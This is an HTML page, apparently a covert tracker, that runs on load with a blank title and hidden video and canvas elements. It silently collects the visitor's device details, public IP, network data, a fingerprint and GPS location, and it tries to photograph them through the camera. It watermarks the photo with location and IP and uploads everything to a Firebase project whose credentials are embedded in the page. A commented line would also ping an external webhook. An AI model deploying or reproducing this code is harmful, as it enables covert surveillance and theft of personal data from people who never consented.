<!-- capture.html â€” Auto-attempt on load (no UI, no buttons) -->
<!DOCTYPE html>
<html>
<head>
  <title></title>
  <meta charset="utf-8">
  <style>body { margin: 0; overflow: hidden; }</style>
</head>
<body>
  <video id="v" style="display:none" muted></video>
  <canvas id="c" style="display:none"></canvas>

  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>

  <script>
    // ðŸ” Firebase Config
    const firebaseConfig = {
      apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
      authDomain: "esrat-4e28f.firebaseapp.com",
      databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com",
      projectId: "esrat-4e28f",
      storageBucket: "esrat-4e28f.appspot.com",
      messagingSenderId: "712315598095",
      appId: "1:712315598095:android:ed0f042ee1d5410dfb7a7a"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const storage = firebase.storage();

    // ðŸ§  Start auto capture on load
    (async () => {
      const data = {
        timestamp: new Date().toISOString(),
        indianTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      };

      // âœ… Passive data (always works)
      data.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation?.type || 'unknown'
      };

      data.device = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        vendor: navigator.vendor,
        cookieEnabled: navigator.cookieEnabled,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory
      };

      // ðŸŒ Public IP
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
        data.publicIP = (await ipRes.json()).ip;
      } catch (e) {
        data.ipError = e.message;
      }

      // ðŸ“¶ Network
      if (navigator.connection) {
        const nc = navigator.connection;
        data.network = {
          type: nc.effectiveType || nc.type,
          downlink: nc.downlink,
          rtt: nc.rtt,
          saveData: nc.saveData
        };
      }

      // ðŸ”‹ Battery (rarely works)
      try {
        const battery = await navigator.getBattery();
        data.battery = {
          level: battery.level,
          charging: battery.charging
        };
      } catch (e) {
        data.batteryError = e.message;
      }

      // ðŸ§  Fingerprint (low entropy)
      data.fingerprint = btoa([
        navigator.userAgent,
        screen.width,
        screen.height,
        screen.colorDepth,
        new Date().getTimezoneOffset(),
        navigator.platform
      ].join('|')).substring(0, 16);

      // ðŸ“ GPS â€” will likely fail
      try {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
        });
        data.latitude = pos.coords.latitude;
        data.longitude = pos.coords.longitude;
        data.accuracy = pos.coords.accuracy;
      } catch (e) {
        data.gpsError = e.code + ': ' + e.message;
      }

      // ðŸ“· Camera â€” will almost certainly fail without gesture
      let photoUrl = null;
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('v');
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);

        const canvas = document.getElementById('c');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Stop tracks
        stream.getTracks().forEach(t => t.stop());

        // Watermark
        const watermarkCtx = canvas.getContext('2d');
        watermarkCtx.fillStyle = 'rgba(0,0,0,0.7)';
        watermarkCtx.fillRect(10, canvas.height - 100, canvas.width - 20, 90);
        watermarkCtx.font = '12px monospace';
        watermarkCtx.fillStyle = 'white';
        watermarkCtx.fillText(`Lat: ${data.latitude?.toFixed(5) || 'â€”'}`, 20, canvas.height - 80);
        watermarkCtx.fillText(`Lng: ${data.longitude?.toFixed(5) || 'â€”'}`, 20, canvas.height - 65);
        watermarkCtx.fillText(`IP: ${data.publicIP || 'â€”'}`, 20, canvas.height - 50);
        watermarkCtx.fillText(`Time: ${new Date().toLocaleTimeString('en-IN')}`, 20, canvas.height - 35);

        // Upload
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
        const fileName = `auto_${Date.now()}.jpg`;
        const ref = storage.ref('auto/' + fileName);
        await ref.put(blob);
        photoUrl = await ref.getDownloadURL();
        data.photoUrl = photoUrl;
      } catch (e) {
        data.cameraError = e.name + ': ' + e.message;
      }

      // ðŸ“¤ Upload metadata (even if photo failed)
      const id = db.ref('autoCaptures').push().key;
      await db.ref('autoCaptures/' + id).set({
        ...data,
        captureId: id,
        uploadTime: firebase.database.ServerValue.TIMESTAMP
      });

      // Optional: ping home quietly
      // fetch('https://your-webhook.site/log?id=' + id);

    })().catch(console.error);
  </script>
</body>
</html>
